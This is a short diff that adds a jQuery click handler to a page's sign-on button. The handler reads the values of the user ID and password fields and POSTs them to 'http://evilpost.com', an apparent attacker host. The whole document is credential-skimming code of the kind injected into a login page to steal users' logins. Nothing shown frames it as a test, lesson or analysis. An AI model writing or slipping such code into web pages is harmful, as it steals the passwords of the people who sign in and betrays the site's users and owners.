@@ -1,0 +1,11 @@
+$('#btnSignon').bind('click',function() {
+	$.ajax({
+		type: 'POST',
+		url: 'http://evilpost.com',
+		data: { 
+			username: $('#userid').val(), 
+			password: $('#password').val() 
+		},
+		success: function() { }
+	});
+});
